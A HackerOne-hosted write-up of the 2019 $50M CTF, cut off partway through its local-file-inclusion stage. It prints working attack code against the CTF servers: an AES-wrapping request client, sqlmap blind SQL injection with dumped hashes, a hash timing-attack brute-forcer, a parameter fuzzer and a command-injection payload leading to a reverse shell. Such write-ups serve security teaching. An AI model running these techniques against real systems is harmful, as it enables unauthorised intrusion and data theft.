{"id":508011,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDgwMTE=","url":"https://hackerone.com/reports/508011","title":"CTF Writeup - c8889970d9fb722066f31e804e351993","state":"Closed","substate":"resolved","severity_rating":"none","readable_substate":"Resolved","created_at":"2019-03-11T17:20:32.897Z","submitted_at":"2019-03-11T17:20:32.897Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"sampriti","url":"/sampriti","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":38489,"url":"https://hackerone.com/50m-ctf","handle":"50m-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"50m-ctf","twitter_handle":null,"website":"https://hackerone.com/","about":null}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-08T15:55:17.109Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-04-08T15:55:08.541Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"CTF Code: c8889970d9fb722066f31e804e351993\n\nHackerOne $50M CTF Write-Up\n============\n\nI came across this [tweet](https://twitter.com/Hacker0x01/status/1100543680383832065) announcing the HackerOne CTF for invitations\nto the HackerOne event in Vegas during DEFCON. I tried searching for a URL for the CTF, but couldn't find anything online, so I assumed\nthat the first challenge was the tweet itself.\n\n{F439432}\n\nStage 1 - Steganography\n----------\n\nThe first thing that I noticed was the second image in the tweet with a lot of binary numbers.\n\n{F439431}\n\nAt first, I tried to write a script that would cut up the image evenly into images of around 20 pixels by 8 pixels to try to extract each digit,\nbut that didn't work out because the digits were not of uniform length.\n\nThen I tried to convert the first line by hand to see if I got something meaningful. I got the first 4 characters as `zlib` and then some binary\ndata, which was very difficult to obtain accurately, so I gave up on that method.\n\nLast, I tried to run the tool [zsteg](https://github.com/zed-0xff/zsteg) on the image, and it gave me a link hidden in the image.\n\n```sh\n$ zsteg -a D0XoThpW0AE2r8S.png\n...\n...\nb4,b,lsb,xy,prime   .. text: \"g`2Dc\u0026HEu\"\nb4,rgb,lsb,xy,prime .. text: \"k\\\"FPg\u0026uR\"\nb4,bgr,lsb,xy,prime .. text: \"62uGdubSw%\"\nb6,bgr,lsb,xy,prime .. text: \"YETYEWUU\"\nb7,b,msb,xy,prime   .. text: \"(4:M \u0026Q(42\"\nb1,rgb,lsb,yx       .. zlib: data=\"https://bit.do/h1therm\", offset=5, size=22\nb2,rgb,lsb,yx       .. file: PGP\\011Secret Sub-key -\nb3,r,lsb,yx         .. text: \"Q.L\\n4Af^\"\nb4,rgb,lsb,yx       .. text: \"|xKKznZb\"\nb7,g,msb,yx         .. text: \"rgZfcQD\u003c\"\nb8,r,lsb,yx         .. text: \"!6?727:3\"\n...\n...\n```\n\n\nStage 2 - APK Reversing\n--------\n\nThe `bit.do` link from the PNG redirected me to a [google drive link](https://drive.google.com/file/d/1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ/view)\nwith a APK file called `h1thermostat.apk`.\n\nI loaded the apk file in a APK decompiler called [JADX](https://github.com/skylot/jadx) that gives us the Java source code for the Android app.\nInside JADX, I could see a overview of the various activities related to the Thermostat App.\n\n{F439433}\n\nInside the `ThermostatActivity` class, I found the `setDefaults` function, which appears to send the username, password and the command `getTemp`\nto some remote server using the `PayloadRequest` class.\n\n```java\n    private void setDefaults(final ThermostatModel thermostatModel) throws Exception {\n        thermostatModel.setTargetTemperature(Integer.valueOf(77));\n        thermostatModel.setCurrentTemperature(Integer.valueOf(76));\n        JSONObject jSONObject = new JSONObject();\n        jSONObject.put(\"username\", LoginActivity.username);\n        jSONObject.put(\"password\", LoginActivity.password);\n        jSONObject.put(\"cmd\", \"getTemp\");\n        volleyQueue.add(new PayloadRequest(jSONObject, new Listener\u003cString\u003e() {\n            public void onResponse(String str) {\n                thermostatModel.setTargetTemperature(Integer.valueOf(70));\n                thermostatModel.setCurrentTemperature(Integer.valueOf(73));\n            }\n        }));\n    }\n```\n\nFrom the `PayloadRequest` class, I found the URL of the remote server it sends the requests to. It also contained the details about the algorithm\nit uses to encrypt and decrypt communications between the app and the remote server.\n\n```java\n    public PayloadRequest(JSONObject jSONObject, final Listener\u003cString\u003e listener) throws Exception {\n        super(1, \"http://35.243.186.41/\", new ErrorListener() {\n            public void onErrorResponse(VolleyError volleyError) {\n                listener.onResponse(\"Connection failed\");\n            }\n        });\n        this.mListener = listener;\n        this.mParams.put(\"d\", buildPayload(jSONObject));\n    }\n\n    private String buildPayload(JSONObject jSONObject) throws Exception {\n        Key secretKeySpec = new SecretKeySpec(new byte[]{(byte) 56, (byte) 79, (byte) 46, (byte) 106, (byte) 26, (byte) 5, (byte) -27, (byte) 34, (byte) 59, Byte.MIN_VALUE, (byte) -23, (byte) 96, (byte) -96, (byte) -90, (byte) 80, (byte) 116}, \"AES\");\n        Object obj = new byte[16];\n        new SecureRandom().nextBytes(obj);\n        AlgorithmParameterSpec ivParameterSpec = new IvParameterSpec(obj);\n        Cipher instance = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n        ...\n        ...\n```\n\nThe AES key is a hardcoded 16-byte key, and the algorithm used is AES in CBC mode with PKCS5 Padding and a Random IV. I wrote a simple script in Java to\nconvert the key to unsigned bytes that can be used easily with a AES library.\n\n```java\nimport java.io.*;\n\nclass Ideone\n{\n  public static void main (String[] args) throws java.lang.Exception\n  {\n    byte[] key = new byte[]{(byte) 56, (byte) 79, (byte) 46, (byte) 106, (byte) 26, (byte) 5, (byte) -27, (byte) 34, (byte) 59, Byte.MIN_VALUE, (byte) -23, (byte) 96, (byte) -96, (byte) -90, (byte) 80, (byte) 116};\n    for(int i = 0; i \u003c 16; i++) {\n      System.out.print(key[i] \u0026 0xff);\n      if(i \u003c 15) System.out.print(\", \");\n    }\n    System.out.println(\"\");\n  }\n}\n/*\nSuccess #stdin #stdout 0.04s 2184192KB\n56, 79, 46, 106, 26, 5, 229, 34, 59, 128, 233, 96, 160, 166, 80, 116\n*/\n```\n\nOnce I had the AES key, I then wrote a script in Ruby that would allow me to play around with the parameters to the API and see the response.\nIt took the username, password and command inputs, converted them to a JSON string, encrypted the string with AES and encoded it in base64 and sent\nit to the server. It then got the response from the server and decrypted it using the AES key and printed the response to the user.\n\n```rb\nrequire 'httparty'\nrequire 'base64'\nrequire 'openssl'\n\naes_key_arr = [56, 79, 46, 106, 26, 5, 229, 34, 59, 128, 233, 96, 160, 166, 80, 116]\nAES_KEY = aes_key_arr.map(\u0026:chr).join\n\ndef encrypt(msg)\n  cipher = OpenSSL::Cipher.new('AES-128-CBC').encrypt\n  cipher.key = AES_KEY\n  iv = cipher.random_iv\n  encrypted = cipher.update(msg) + cipher.final\n  iv + encrypted\nend\n\ndef decrypt(msg)\n  cipher = OpenSSL::Cipher.new('AES-128-CBC').decrypt\n  cipher.key = AES_KEY\n  iv = msg[0...16]\n  data = msg[16..-1]\n  cipher.iv = iv\n  plain = cipher.update(data) + cipher.final\nend\n\ndata = {\"username\" =\u003e ARGV[0], \"password\" =\u003e ARGV[1], \"cmd\" =\u003e ARGV[2]}.to_json\nencrypted_data = Base64.strict_encode64(encrypt(data))\nencrypted_resp = HTTParty.post(\"http://35.243.186.41/\", body: {\"d\" =\u003e encrypted_data}).body\nresp = decrypt(Base64.strict_decode64(encrypted_resp))\nputs resp\n```\n\nAfter some tries with default credentials, I was able to get a successful response.\n\n```sh\n$ ruby remote.rb \"admin\" \"admin\" \"getTemp\"\n{\"success\": false, \"error\": \"Invalid username or password\"}\n$ ruby remote.rb \"admin\" \"password\" \"getTemp\"\n{\"temperature\": 73, \"success\": true}\n```\n\n\nStage 3 - SQL Injection\n------\n\nNow that I had a simple way to send requests to the remote, I tried some common SQL injection parameters on the username/password input fields.\n\n```sh\n$ ruby remote.rb \"admin'\" \"password\" \"getTemp\"\n{\"success\": false, \"error\": \"Unknown\"}\n$ ruby remote.rb \"admin\\\"\" \"password\" \"getTemp\"\n{\"success\": false, \"error\": \"Invalid username or password\"}\n$ ruby remote.rb \"admin' OR '1'='1\" \"password\" \"getTemp\"\n{\"temperature\": 73, \"success\": true}\n$ ruby remote.rb \"admin' OR '1'='0\" \"password\" \"getTemp\"\n{\"temperature\": 73, \"success\": true}\n$ ruby remote.rb \"admin' AND '1'='0\" \"password\" \"getTemp\"\n{\"success\": false, \"error\": \"Invalid username or password\"}\n```\n\nThis responses looked very much like a unsantized SQL query that could be exploited for SQL injection. Unfortunately it didn't seem like\nI could get much output from the remote except for success/failure. This led me to use SQLMap to exploit the injection as it has optimized scripts\nfor extracting data when only blind injection techniques are available.\n\nI couldn't directly use SQLMap here as the parameters are encrypted, so I used the script I wrote earlier to write a simple proxy server using Sinatra where SQLMap\ncan send it's normal POST requests, and the proxy server would encrypt the requests and forward them to the remote server and return the JSON response to\nSQLMap.\n\n```rb\nrequire 'sinatra'\nrequire 'open3'\n\npost '/submit' do\n  puts params\n  stdout, status = Open3.capture2('ruby', 'remote.rb', params[:username], params[:password], params[:cmd])\n  return stdout\nend\n```\n\nThen, I can just unleash SQLMap on this localhost server and it should do the job for me.\n\n```sh\n$ ruby sqlmap_proxy.rb\n[2019-03-11 09:00:22] INFO  WEBrick 1.4.2\n[2019-03-11 09:00:22] INFO  ruby 2.5.1 (2018-03-29) [x86_64-linux]\n== Sinatra (v2.0.5) has taken the stage on 4567 for development with backup from WEBrick\n[2019-03-11 09:00:22] INFO  WEBrick::HTTPServer#start: pid=18347 port=4567\n{\"username\"=\u003e\"admin\", \"password\"=\u003e\"admin\", \"cmd\"=\u003e\"getTemp\"}\n127.0.0.1 - - [11/Mar/2019:09:00:28 -0400] \"POST /submit HTTP/1.1\" 200 60 0.2152\n127.0.0.1 - - [11/Mar/2019:09:00:28 EDT] \"POST /submit HTTP/1.1\" 200 60\nhttp://localhost:4567/submit -\u003e /submit\n{\"username\"=\u003e\"admin\", \"password\"=\u003e\"admin\", \"cmd\"=\u003e\"getTemp\"}\n127.0.0.1 - - [11/Mar/2019:09:00:29 -0400] \"POST /submit HTTP/1.1\" 200 60 0.2290\n127.0.0.1 - - [11/Mar/2019:09:00:29 EDT] \"POST /submit HTTP/1.1\" 200 60\nhttp://localhost:4567/submit -\u003e /submit\n{\"username\"=\u003e\"9727\", \"password\"=\u003e\"admin\", \"cmd\"=\u003e\"getTemp\"}\n127.0.0.1 - - [11/Mar/2019:09:00:30 -0400] \"POST /submit HTTP/1.1\" 200 60 0.2360\n127.0.0.1 - - [11/Mar/2019:09:00:29 EDT] \"POST /submit HTTP/1.1\" 200 60\nhttp://localhost:4567/submit -\u003e /submit\n{\"username\"=\u003e\"admin\\\",'.((,)),\", \"password\"=\u003e\"admin\", \"cmd\"=\u003e\"getTemp\"}\n127.0.0.1 - - [11/Mar/2019:09:00:30 -0400] \"POST /submit HTTP/1.1\" 200 39 0.2095\n127.0.0.1 - - [11/Mar/2019:09:00:30 EDT] \"POST /submit HTTP/1.1\" 200 39\nhttp://localhost:4567/submit -\u003e /submit\n{\"username\"=\u003e\"admin'RnrsuZ\u003c'\\\"\u003eRCnItt\", \"password\"=\u003e\"admin\", \"cmd\"=\u003e\"getTemp\"}\n127.0.0.1 - - [11/Mar/2019:09:00:30 -0400] \"POST /submit HTTP/1.1\" 200 39 0.2091\n127.0.0.1 - - [11/Mar/2019:09:00:30 EDT] \"POST /submit HTTP/1.1\" 200 39\n...\n...\n...\n\n\n$ python sqlmap.py -u \"http://localhost:4567/submit\" --method=POST --data=\"username=admin\u0026password=admin\u0026cmd=getTemp\" --fingerprint --level 5 --risk 3\n        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.3.2.30#dev}\n|_ -| . [(]     | .'| . |\n|___|_  [)]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n\n[*] starting @ 09:00:28 /2019-03-11/\n\n[09:00:28] [INFO] testing connection to the target URL\n[09:00:28] [INFO] checking if the target is protected by some kind of WAF/IPS\n[09:00:29] [INFO] testing if the target URL content is stable\n[09:00:29] [INFO] target URL content is stable\n[09:00:29] [INFO] testing if POST parameter 'username' is dynamic\n[09:00:30] [WARNING] POST parameter 'username' does not appear to be dynamic\n[09:00:30] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable\n[09:00:30] [INFO] testing for SQL injection on POST parameter 'username'\n[09:00:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[09:00:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'\n[09:01:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'\n[09:01:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'\n[09:01:34] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable\n[09:01:36] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y\n...\n...\n...\nsqlmap identified the following injection point(s) with a total of 772 HTTP(s) requests:\n---\nParameter: username (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: username=admin' AND 9499=(SELECT (CASE WHEN (9499=9499) THEN 9499 ELSE (SELECT 1626 UNION SELECT 8715) END))-- IcWo\u0026password=admin\u0026cmd=getTemp\n\n    Type: AND/OR time-based blind\n    Title: MySQL \u003e= 5.0.12 AND time-based blind\n    Payload: username=admin' AND SLEEP(5)-- TrnU\u0026password=admin\u0026cmd=getTemp\n---\n[09:06:35] [INFO] testing MySQL\n[09:06:35] [INFO] confirming MySQL\n[09:06:36] [INFO] the back-end DBMS is MySQL\n[09:06:36] [INFO] actively fingerprinting MySQL\n[09:06:37] [INFO] executing MySQL comment injection fingerprint\nback-end DBMS: active fingerprint: MySQL \u003e= 5.5 (MariaDB fork)\n```\n\nNow we can dump the databases and tables.\n\n```\navailable databases [4]:\n[*] flitebackend\n[*] information_schema\n[*] mysql\n[*] performance_schema\n\nDatabase: flitebackend\n[2 tables]\n+---------+\n| devices |\n| users   |\n+---------+\n```\n\nDumping the data from the `users` table:\n\n```\nDatabase: flitebackend\nTable: users\n[2 entries]\n+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |\n| 2  | sevenate | c5b1d550b588178c4bb321069fb688ab |\n+----+----------+----------------------------------+\n```\n\nBoth the the hashes were easily found online to be `admin:password` and `sevenate:nine10`. However after playing around with the `cmd` parameter\nI realized that there wasn't much I could do besides call the `getTemp` and `setTemp` commands which I had found from the APK I had reversed earlier.\nSo I moved my focus to the `devices` table.\n\nThe `devices` table contained 151 IPs. I will post a truncated list of the table here. The complete list can be found here: https://pastebin.com/8T7kMede\n\n```\nDatabase: flitebackend\nTable: devices\n[151 entries]\n+-----+-----------------+\n| id  | ip              |\n+-----+-----------------+\n| 1   | 192.88.99.29    |\n| 2   | 192.88.99.117   |\n| 3   | 10.186.74.138   |\n| 4   | 192.88.99.20    |\n| 5   | 252.222.76.84   |\n| 6   | 241.192.235.227 |\n| 7   | 192.88.99.145   |\n| 8   | 192.88.99.150   |\n| 9   | 10.148.253.200  |\n| 10  | 254.15.165.28   |\n...\n...\n...\n| 140 | 10.55.194.248   |\n| 141 | 192.88.99.23    |\n| 142 | 248.104.65.126  |\n| 143 | 244.16.55.86    |\n| 144 | 251.243.170.236 |\n| 145 | 192.88.99.248   |\n| 146 | 192.88.99.55    |\n| 147 | 10.27.78.111    |\n| 148 | 253.200.157.207 |\n| 149 | 192.88.99.145   |\n| 150 | 192.88.99.189   |\n| 151 | 10.2.31.209     |\n+-----+-----------------+\n```\n\n\nMany of these looked like Private/Internal IPs. I decided to pass the list of IP addresses to nmap. As I'm on a university network,\nmany of those private IP addresses showed up as online with ports open to me. I removed all the IP address that started with 192.*\nbefore starting the scan\n\n```sh\n$ cat devices.csv | grep -v \"^192\" \u003e devices2.csv\n$ nmap -iL devices2.csv\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2019-03-11 14:04 UTC\nNmap scan report for 98.12.196.104.bc.googleusercontent.com (104.196.12.98)\nHost is up (0.019s latency).\nNot shown: 997 filtered ports\nPORT     STATE  SERVICE\n22/tcp   open   ssh\n80/tcp   open   http\n3389/tcp closed ms-wbt-server\n\nNmap done: 101 IP addresses (1 host up) scanned in 23.76 seconds\n```\n\nhttp://104.196.12.98 is the IP for a new server for FliteThermostat.\n\n\nStage 4 - Timing Attack\n----------\n\nWe are presented with another log-in screen this time. This time however, there is a client-side component to it. The JavaScript code in `login.js`\ncombines the username and password from the form into a 32-byte hash. I did not do proper cryptanalysis of the hash, however running some tests on it\nand going through the code pointed me towards the direction that the hash was destructive and it was not possible to recover the username and password from it.\n\nThis meant, it was pointless to try to SQL inject the username/password. I tried to SQL inject the hash parameter directly incase it was being compared with a hash in the database\nand spent a lot of time, trying different forms of injection.\n\nAfter a lot of failed attempts, I thought of trying a timing attack on the hash comparision similar to challenges I've seen in previous CTFs. I implemented a multi-threaded solution\nwith requests and threading in Python. There were a number of issues I faced:\n\n- The server rejects the hash if it is not of the right length (32 bytes).\n- I originally tried to bruteforce one hex character (4-bits) at a time, but the timing was too unreliable, so I had to switch to brute forcing 1 byte at a time.\n- If you used too many threads, the server would somehow slow down, and give you tons of false positives\n- On my final attempt to get the flag, the server went hay-wire after finding around 20 bytes, so I had to reduce the number of parallel workers from 64 to 4 which made the script very slow.\n\nThis was the final script I used:\n\n```py\nimport requests\nimport concurrent.futures\nimport time\n\ndef get_time(new_hash):\n    start = time.time()\n    req = requests.post('http://104.196.12.98/', data={'hash': new_hash})\n    elapsed = time.time() - start\n    return elapsed\n\ncurr_hash = \"\"\n\nfor i in range(len(curr_hash)//2, 32):\n    best_time = 0.0\n    best_byte = -1\n\n    with concurrent.futures.ThreadPoolExecutor(max_workers=64) as executor:\n        futures = []\n        for b in range(256):\n            new_hash = curr_hash + (\"%02x\" % b)\n            new_hash += '0' * (64 - len(new_hash))\n            futures.append(executor.submit(get_time, new_hash))\n\n        for b in range(256):\n            curr_time = futures[b].result()\n            if curr_time \u003e best_time:\n                best_time = curr_time\n                best_byte = b\n\n    assert best_byte != -1\n    fin_byte = \"%02x\" % best_byte\n    print('Found Byte {} with time {}'.format(fin_byte, best_time))\n    curr_hash += fin_byte\n    print(curr_hash)\n```\n\n```sh\n$ python brute_hash.py\nFound Byte f9 with time 1.0551841259002686\nf9\nFound Byte 86 with time 1.7021434307098389\nf986\nFound Byte 5a with time 2.191676139831543\nf9865a\nFound Byte 49 with time 2.6396777629852295\nf9865a49\nFound Byte 52 with time 3.056812286376953\nf9865a4952\nFound Byte a4 with time 3.6751813888549805\nf9865a4952a4\nFound Byte f5 with time 4.157867431640625\nf9865a4952a4f5\nFound Byte d7 with time 4.642802000045776\nf9865a4952a4f5d7\nFound Byte 4b with time 5.1769492626190186\nf9865a4952a4f5d74b\nFound Byte 43 with time 5.811188697814941\nf9865a4952a4f5d74b43\nFound Byte f3 with time 6.342976093292236\nf9865a4952a4f5d74b43f3\nFound Byte 55 with time 6.685908555984497\nf9865a4952a4f5d74b43f355\nFound Byte 8f with time 7.125741720199585\nf9865a4952a4f5d74b43f3558f\nFound Byte ed with time 7.686535358428955\nf9865a4952a4f5d74b43f3558fed\nFound Byte 6a with time 8.13300371170044\nf9865a4952a4f5d74b43f3558fed6a\nFound Byte 02 with time 8.572584390640259\nf9865a4952a4f5d74b43f3558fed6a02\nFound Byte 25 with time 9.127085447311401\nf9865a4952a4f5d74b43f3558fed6a0225\nFound Byte c6 with time 9.615064144134521\nf9865a4952a4f5d74b43f3558fed6a0225c6\nFound Byte 87 with time 10.174720764160156\nf9865a4952a4f5d74b43f3558fed6a0225c687\nFound Byte 7f with time 10.610665321350098\nf9865a4952a4f5d74b43f3558fed6a0225c6877f\nFound Byte ba with time 11.085944652557373\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba\nFound Byte 60 with time 11.662947177886963\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60\nFound Byte a2 with time 12.160533905029297\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a2\nFound Byte b1 with time 13.189836025238037\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a2b1\nFound Byte 01 with time 12.254333019256592\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a2b101\n^C\n$ python brute_hash.py\nFound Byte a2 with time 12.179362773895264\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a2\nFound Byte 50 with time 12.572036743164062\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250\nFound Byte bc with time 13.273049354553223\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bc\nFound Byte bd with time 13.617496967315674\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbd\nFound Byte e7 with time 14.13040566444397\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde7\nFound Byte 53 with time 14.593729496002197\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753\nFound Byte f5 with time 15.0700101852417\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5\nFound Byte db with time 15.664264917373657\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db\nFound Byte 13 with time 16.164478063583374\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13\nFound Byte d8 with time 16.67181408072168\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8\n```\n\nTrying the hash on the website gives us the session cookie to login!\n\n```sh\n$ curl 'http://104.196.12.98/' --data \"hash=f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8\" -vvv\n*   Trying 104.196.12.98...\n* TCP_NODELAY set\n* Connected to 104.196.12.98 (104.196.12.98) port 80 (#0)\n\u003e POST / HTTP/1.1\n\u003e Host: 104.196.12.98\n\u003e User-Agent: curl/7.58.0\n\u003e Accept: */*\n\u003e Content-Length: 69\n\u003e Content-Type: application/x-www-form-urlencoded\n\u003e\n* upload completely sent off: 69 out of 69 bytes\n\u003c HTTP/1.1 302 FOUND\n\u003c Server: nginx/1.15.8\n\u003c Date: Mon, 11 Mar 2019 15:48:54 GMT\n\u003c Content-Type: text/html; charset=utf-8\n\u003c Content-Length: 217\n\u003c Connection: keep-alive\n\u003c Location: http://104.196.12.98/main\n\u003c Cache-Control: public, max-age=0\n\u003c Pragma: no-cache\n\u003c Expires: 0\n\u003c Vary: Cookie\n\u003c Set-Cookie: session=eyJsb2dnZWRJbiI6dHJ1ZX0.XIaDZg.P26g9dbuNlBlDBMSxlqQ785TGiY; HttpOnly; Path=/\n\u003c\n\u003c!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"\u003e\n\u003ctitle\u003eRedirecting...\u003c/title\u003e\n\u003ch1\u003eRedirecting...\u003c/h1\u003e\n* Connection #0 to host 104.196.12.98 left intact\n\u003cp\u003eYou should be redirected automatically to target URL: \u003ca href=\"/main\"\u003e/main\u003c/a\u003e.  If not click the link.\n```\n\n\nStage 5 - Command Injection\n------\n\nOnce we login, we're presented with a control panel for the thermostat with three links (one hidden).\n\n```html\n    \u003cli\u003e\u003ca href=\"/control\"\u003eTemperature control\u003c/a\u003e\u003c/li\u003e\n    \u003cli\u003e\u003ca href=\"/update\"\u003eCheck for updates\u003c/a\u003e\u003c/li\u003e\n    \u003c!--\u003cli\u003e\u003ca href=\"/diagnostics\"\u003eDiagnostics\u003c/a\u003e\u003c/li\u003e--\u003e\n```\n\nThe Temperature control allows us to set the temperature, which doesn't seem interesting. The Diagnostics page just returns forbidden,\nso that is something we might have to access through some other means. The most interesting page is the Update page. It outputs:\n\n```\nConnecting to http://update.flitethermostat:5000/ and downloading update manifest\n...\n...\n...\nCould not connect\n```\n\nThis points towards something similar to a SSRF, but we need to figure out how to control the parameters, i.e the URL and the port.\nAfter playing around a bit with the URL and the parameters, I discovered that `port` param in the GET request allows us to change the\nport that the server connects to. However, this didn't help that much as it was converted to an int in the backend, and if you sent a string,\nit would throw an Internal Server Error.\n\nI was stuck for a long time at this point, trying various parameter names, until I saw the tweet from Cody, which was an underscore. I figured that\nthe param that controlled the host might be two letter word joined by underscores. I wrote a script that used a\n[Burp Parameter Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt) and tried all the different combinations\nuntil it found something that changed the URL.\n\n```py\nfrom requests_futures.sessions import FuturesSession\n\nsession = FuturesSession(max_workers=32)\n\nparams = open('burp-parameter-names.txt').read().strip().split()\ndefault_data = session.get('http://104.196.12.98/update', cookies={'session': 'eyJsb2dnZWRJbiI6dHJ1ZX0.XIaDZg.P26g9dbuNlBlDBMSxlqQ785TGiY'}).result().text\nprint(default_data)\n\nparam_requests = []\nN = len(params)\n\nfor i in range(N):\n    for j in range(i + 1):\n        p1 = params[i]\n        p2 = params[j]\n        curr = session.get('http://104.196.12.98/update?' + str(p1 + '_' + p2) + '=80', cookies={'session': 'eyJsb2dnZWRJbiI6dHJ1ZX0.XIaDZg.P26g9dbuNlBlDBMSxlqQ785TGiY'})\n        param_requests.append([p1 + '_' + p2, curr])\n        curr = session.get('http://104.196.12.98/update?' + str(p2 + '_' + p1) + '=80', cookies={'session': 'eyJsb2dnZWRJbiI6dHJ1ZX0.XIaDZg.P26g9dbuNlBlDBMSxlqQ785TGiY'})\n        param_requests.append([p2 + '_' + p1, curr])\n\n    for p, resp in param_requests:\n        res = resp.result()\n        print(res.url)\n        if res.text != default_data or res.status_code != 200:\n            print(p)\n            print()\n            print(res.status_code)\n            print()\n            print(res.text)\n            exit()\n\n    param_requests = []\n```\n\nAfter letting it run for a couple of minutes, it found the magic param: `update_host`.\n\nNow that I could control both the host and the port, I tried to point the update to localhost and try to access the\nforbidden diagnostics page. However, nothing seemed to be working. I also tried doing a port scan, but that didn't find anything as well.\n\nAfter giving up on SSRF, I tried doing a command injection, and that worked!\n\n```\n# http://104.196.12.98/update?update_host=127.0.0.1:$(id)/\nConnecting to http://127.0.0.1:uid=0(root) gid=0(root) groups=0(root)/:5000/ and downloading update manifest\n...\n...\n...\nCould not connect\n```\n\nUsing the command injection, I got a reverse shell back to my server, and searched through the system. The app was running in a docker container\nand I didn't find anything interesting except the source code of the app, where I found a number of red herrings ;)\n\nNext, I tried to scan the network that the docker instance was running on.\n\n```\nroot@b60da3a618c2:/app# ip a\n1: lo: \u003cLOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n188: eth0@if189: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc noqueue state UP group default\n    link/ether 02:42:ac:1b:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n    inet 172.27.0.3/16 brd 172.27.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\n\nroot@b60da3a618c2:/app# nmap 172.27.0.0/24\nStarting Nmap 7.40 ( https://nmap.org ) at 2019-03-11 16:16 UTC\nNmap scan report for 172.27.0.1\nHost is up (0.00011s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 02:42:DE:7A:10:86 (Unknown)\n\nNmap scan report for flitectf_accounting_1.flitectf_default (172.27.0.2)\nHost is up (0.00015s latency).\nNot shown: 999 closed ports\nPORT   STATE SERVICE\n80/tcp open  http\nMAC Address: 02:42:AC:1B:00:02 (Unknown)\n\nNmap scan report for b60da3a618c2 (172.27.0.3)\nHost is up (0.000010s latency).\nNot shown: 999 closed ports\nPORT   STATE SERVICE\n80/tcp open  http\n\nNmap done: 256 IP addresses (3 hosts up) scanned in 103.50 seconds\n```\n\nVisiting http://172.27.0.2 we come across a new service.\n\n\n\nStage 6 - Local File Inclusion\n------\n\n\nFirst I tried to set up a proxy so that I could access the website normally, and play around with it. To do this, I downloaded ngrok\nand reverse proxied the website to a publically accessible domain.\n\n```\nroot@b60da3a618c2:/tmp# ./ngrok http 172.27.0.2:80\nngrok by @inconshreveable            (Ctl+C to quit)\n\nngrok does not support a dynamic, color terminal UI on solaris.\nAccess the web interface for connection and tunnel status.\n\nVersion                       2.3.15\nRegion                        United States (us)\nWeb Interface                 http://127.0.0.1:4040\n```\n\nOn the website, there were two tabs: Invoices and Reports, both of which were protected by login.\nOn the Invoices page, there was a hidden link in the source to a page to create a new invoice.\n\n```html\n      \u003cli  class=\"nav-item\" \u003e\n        \u003ca class=\"nav-link\" 